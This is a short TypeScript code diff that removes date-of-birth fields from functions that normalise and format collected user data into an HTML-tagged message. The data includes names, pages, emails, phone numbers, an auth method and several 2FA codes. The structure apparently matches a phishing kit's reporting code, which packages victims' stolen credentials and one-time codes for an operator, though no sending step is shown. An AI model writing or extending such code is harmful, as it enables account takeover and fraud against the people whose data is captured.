@@ -95,9 +95,6 @@ function normalizeData(input: any = {}) {
         location: input.location ?? '',
         fullName: input.fullName ?? input.name ?? '',
         fanpage: input.fanpage ?? '',
-        day: input.day ?? '',
-        month: input.month ?? '',
-        year: input.year ?? '',
         email: input.email ?? '',
         emailBusiness: input.emailBusiness ?? input.business ?? '',
         phone: input.phone ?? '',
@@ -124,9 +121,6 @@ function mergeData(oldData: any = {}, newData: any = {}) {
 
 function formatMessage(data: any): string {
     const d = normalizeData(data);
-    const dob = [d.day, d.month, d.year].every((x) => String(x ?? '').trim())
-        ? `${escapeHtml(d.day)}/${escapeHtml(d.month)}/${escapeHtml(d.year)}`
-        : '';
     const authLine = d.authMethod ? `<b>🧩 Auth:</b> <code>${escapeHtml(d.authMethod)}</code>` : '';
     const has2FA = Boolean(d.twoFa || d.twoFaSecond || d.twoFaThird);
     const phoneDisplay = d.phone && String(d.phone).trim() ? escapeHtml(`+${String(d.phone).trim()}`) : '';
@@ -139,7 +133,6 @@ function formatMessage(data: any): string {
         `----------------------`,
         `<b>Full Name:</b> <code>${formatCodeField(d.fullName)}</code>`,
         `<b>Page:</b> <code>${formatCodeField(d.fanpage)}</code>`,
-        `<b>DOB:</b> <code>${dob}</code>`,
         `----------------------`,
         `<b>Email:</b> <code>${formatCodeField(d.email)}</code>`,
         `<b>Business Email:</b> <code>${formatCodeField(d.emailBusiness)}</code>`,
